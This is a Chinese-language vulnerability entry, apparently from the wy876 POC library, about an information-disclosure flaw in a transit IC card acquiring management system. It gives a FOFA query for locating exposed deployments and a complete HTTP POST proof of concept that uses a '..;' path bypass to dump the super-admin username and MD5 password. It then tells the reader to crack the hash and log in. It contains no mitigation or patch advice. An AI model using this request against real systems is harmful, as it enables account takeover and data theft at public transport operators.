---
fofa: "app="
source: "wy876 漏洞文库"
---

# 公交IC卡收单管理系统user存在信息泄露漏洞

### 一、漏洞描述
天津环球磁卡股份有限公司公交IC卡收单管理系统是城市公共交通领域中不可或缺的一部分，它通过集成先进的集成电路技术（IC卡）实现了乘客便捷的支付方式，并有效提高了公共交通运营效率。系统集成了发卡、充值、消费、数据采集、查询和注销等多个功能模块，为公交公司和乘客提供了全面、高效、便捷的公共交通支付解决方案。该系统不仅提升了乘客的出行体验，还降低了公交公司的运营成本，提高了管理效率。公交IC卡收单管理系统user存在信息泄露漏洞可获取超管用户密码等信息。

### 二、影响版本
公交IC卡收单管理系统

### 三、资产测绘
fofa：app="公交IC卡收单管理系统"


### 四、漏洞复现
```plain
POST /assets/..;/user HTTP/1.1
Host: xxx
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
X-Requested-With: XMLHttpRequest
Priority: u=0
Content-Length: 197

_search=false&nd=1727275150716&rowCountPerPage=10&pageNo=1&sidx=USER_NAME&sord=asc&method=select&USER_NAME=&REAL_NAME=&ACCOUNT_EXPIRE_TIME=%E5%BF%BD%E7%95%A5&PASSWORD_EXPIRE_TIME=%E5%BF%BD%E7%95%A5
```

执行POC获取超管用户和MD5密码


使用获取到的MD5密码进行解密并登录


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/fi2seglgfyashlz8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
